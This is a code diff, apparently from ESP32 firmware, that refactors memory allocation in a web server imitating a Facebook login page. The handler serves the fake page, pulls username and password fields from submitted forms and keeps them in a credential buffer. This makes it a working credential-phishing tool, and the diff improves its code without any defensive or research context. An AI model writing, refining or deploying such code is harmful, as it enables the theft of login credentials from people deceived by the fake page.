@@ -1,6 +1,8 @@
 #ifndef FACEBOOK_WEB_SERVER_H
 #define FACEBOOK_WEB_SERVER_H
 
+#include "allocator.h"
+
 // Structură pentru a păstra o singură intrare de credențiale
 typedef struct {
     char username[128];
@@ -60,7 +62,7 @@ int cred_buffer_to_json(cred_buffer_t* buffer, char* out, size_t out_size) {
     return (int)len;
 }
 
-void handle_facebook_connection(http_request_t* req, int client_sock) {
+void handle_facebook_connection(allocator_t* allocator, http_request_t* req, int client_sock) {
     if(strcmp(req->method, "GET") == 0){
         ESP_LOGI("FacebookWebServer", "Handling GET request");
         http_send_html_response(client_sock, facebook_page_html);
@@ -68,16 +70,14 @@ void handle_facebook_connection(http_request_t* req, int client_sock) {
     else if(strcmp(req->method, "POST") == 0) {
         ESP_LOGI("FacebookWebServer", "Handling POST request");
         printf("BODY: %s\n", req->body);
-        char username[128];
-        char password[128];
-        int ret = extract_form_field_to_buffer(req->body, "username", username, 128);
-        if (ret != 0) {
+        char* username = extract_form_field_to_buffer(allocator, req->body, "username");
+        if (!username) {
             ESP_LOGE("FacebookWebServer", "Failed to extract username");
             http_send_bad_request_response(client_sock);
             return;
         }
-        ret = extract_form_field_to_buffer(req->body, "password", password, 128);
-        if (ret != 0) {
+        char* password = extract_form_field_to_buffer(allocator, req->body, "password");
+        if (!password) {
             ESP_LOGE("FacebookWebServer", "Failed to extract password");
             http_send_bad_request_response(client_sock);
             return;
@@ -92,6 +92,10 @@ void handle_facebook_connection(http_request_t* req, int client_sock) {
 }
 
 void serve_facebook_page(){
+    uint8_t mem[2048];
+    allocator_t alloc = {0};
+    allocator_init(&alloc, mem, 2048);
+
     ESP_LOGI("FacebookWebServer", "Creating socket...");
     int sock = socket_create(IPv4, Stream);
     if (sock < 0) {
@@ -123,8 +127,8 @@ void serve_facebook_page(){
         }
         ESP_LOGI("FacebookWebServer", "Connection accepted...");
 
-        char buffer[1024];
-        int len = socket_receive(client_sock, (unsigned char*)buffer, sizeof(buffer) - 1);
+        char* buffer = allocator_alloc_type(&alloc, char, 1024);
+        int len = socket_receive(client_sock, (unsigned char*)buffer, 1023);
         if (len < 0) {
             ESP_LOGE("FacebookWebServer", "Failed to receive data");
             close(client_sock);
@@ -132,12 +136,13 @@ void serve_facebook_page(){
         }
         buffer[len] = 0;
         
-        http_request_t req = http_request_parse(buffer);
-        printf("Facebook Request Method: %s\n", req.method);
-        printf("Facebook Request URL: %s\n", req.url);
+        http_request_t* req = http_request_parse(&alloc, buffer);
+        printf("Facebook Request Method: %s\n", req->method);
+        printf("Facebook Request URL: %s\n", req->url);
 
-        handle_facebook_connection(&req, client_sock);
+        handle_facebook_connection(&alloc, req, client_sock);
 
+        allocator_reset(&alloc);
         close(client_sock);
     }
 }
